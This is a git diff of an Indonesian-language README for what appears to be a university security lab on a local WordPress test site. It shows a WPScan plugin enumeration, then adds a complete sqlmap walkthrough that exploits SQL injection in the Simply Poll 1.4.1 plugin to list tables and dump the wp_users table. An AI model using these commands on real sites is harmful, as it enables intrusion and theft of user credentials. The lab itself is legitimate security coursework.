@@ -74,14 +74,37 @@ http://192.168.100.19/wordpress/ -> (http://alamatip/nama_folder)
 - Buka terminal pada folder dimana wpscan berada, jalankan perintah:<pre>
 ruby wpscan.rb --url alamat_site  --enumerate vp
 </pre>
-       Parameter `vp` pada `--enumerate` untuk memunculkan hasil plugin yang vulnerable.
+       Parameter  `vp`  pada  `--enumerate`  untuk memunculkan hasil plugin yang vulnerable.
 
 - Hasil dari WPScan:
 
 ![hasil 1](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/wpscanrun1.png)
 ![hasil 2](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/wpscanresult1.png)
+![hasil 3](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/wpscan%202.png)
 
 ### sqlmap
+
+#### Plugin - Simply Poll 1.4.1
+- Buka terminal pada folder dimana sqlmap berada, jalankan perintah:<pre>
+python sqlmap -u "http://alamat_site/wp-admin/admin-ajax.php"  --data="action=spAjaxResult&&pollid=iddaripoll" --dbms=mysql --level=5 --risk=3
+</pre>
+
+![simplypol 1](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/simplypoll1.png)
+![simplypol 2](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/simplypoll2.png)
+![simplypol 3](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/simplypoll3.png)
+
+- Dari hasil sebelumnya telah didapatkan parameter yang vurnable, untuk mendapatkan list table yang terdapat di databasa sasaran maka tambahkan `-p pollid --tables` pada perintah dan jalankan. Hasil:
+
+![simplypol 4](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/simplypoll4.png)
+![simplypol 5](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/simplypoll5.png)
+![simplypol 6](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/simplypoll6.png)
+![simplypol 7](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/simplypoll7.png)
+![simplypol 8](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/simplypoll8.png)
+
+- Dari hasil sebelumnya didapatkan list database dan table yang ada pada server. Untuk mendapatkan isi tabel wp_users dari database wordpress, maka tambahkan `-D wordpress -T wp_users` pada perintah dan jalankan. Hasil:
+
+![simplypol 9](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/simplypoll9.png)
+![simplypol 10](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/simplypoll10.png)
 
 ## Kesimpulan dan Saran
 
